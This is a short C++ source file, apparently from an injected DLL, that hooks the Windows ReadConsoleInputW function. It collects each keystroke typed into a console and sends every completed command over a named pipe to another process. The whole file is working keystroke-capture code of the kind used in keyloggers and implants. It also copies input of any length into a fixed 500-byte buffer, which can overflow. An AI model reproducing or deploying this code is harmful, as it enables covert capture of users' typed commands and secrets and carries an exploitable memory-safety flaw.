#include "pch.h"
#include "hook_funcs_console.h"

extern HANDLE hPipe1;

std::string cur_command = "";

VOID KeyEventProc(KEY_EVENT_RECORD ker) {
    if (ker.bKeyDown) {
        if (ker.uChar.AsciiChar == 0x03) {
            std::cout << "\n CONTROL-C \n\n";
            cur_command = "";
        } else if (ker.uChar.AsciiChar == 0x0D) {
            std::cout << "\n ENTER \n\n";
            char buf[500] = { 0 };
            memcpy(buf, cur_command.c_str(), cur_command.length());
            DWORD cbWritten;
            DWORD dwBytesToWrite = cur_command.length();
            WriteFile(hPipe1, buf, dwBytesToWrite, &cbWritten, NULL);
            cur_command = "";
        } else {
            cur_command += ker.uChar.AsciiChar;
        }
    }
}

BOOL Hook_ReadConsoleInputW(
    _In_  HANDLE        hConsoleInput,
    _Out_ PINPUT_RECORD lpBuffer,
    _In_  DWORD         nLength,
    _Out_ LPDWORD       lpNumberOfEventsRead
) {
    BOOL res = ReadConsoleInputW(
        hConsoleInput,
        lpBuffer,
        nLength,
        lpNumberOfEventsRead
    );

    for (int i = 0; i < *lpNumberOfEventsRead; i++) {
        switch (lpBuffer[i].EventType) {
        case KEY_EVENT: // keyboard input 
            KeyEventProc(lpBuffer[i].Event.KeyEvent);
            break;
        }
    }
    return res;
}
